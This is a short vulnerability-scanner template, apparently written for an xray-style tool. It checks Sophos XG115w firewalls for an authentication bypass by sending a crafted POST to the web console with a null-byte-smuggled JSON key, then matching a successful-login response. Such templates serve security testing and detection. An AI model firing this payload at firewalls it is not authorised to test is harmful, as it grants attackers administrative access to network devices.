id: sophos-xg115w-firewall-mr-10-authentication

info:
  name: Sophos XG115w Firewall 17.0.10 MR-10 - Authentication Bypass
  author: Aryan Chehreghani
  severity: high
  verified: true
  description: |
    此漏洞允许攻击者通过绕过身份验证获得对防火墙管理空间的未经授权的访问。
  reference:
    - https://www.exploit-db.com/exploits/51006
  tags: sophos,xg115w,firewall,mr-10,authentication,bypass
  created: 2025/08/15

set:
  hosturl: request.url
rules:
  r0:
    request:
      method: POST
      path: /webconsole/Controller
      body: |
        mode=151&json={"username"%3a"admin","password"%3a"somethingnotpassword","languageid"%3a"1","browser"%3a"Chrome_101","accessaction"%3a1,+"mode\u0000ef"%3a716}&__RequestType=ajax&t=1653896534066
    expression: |
      response.status == 200 && 
      response.body.bcontains(b'{"redirectionURL":"/webpages/index.jsp"') && 
      response.body.bcontains(b'"status":200')
expression: r0()
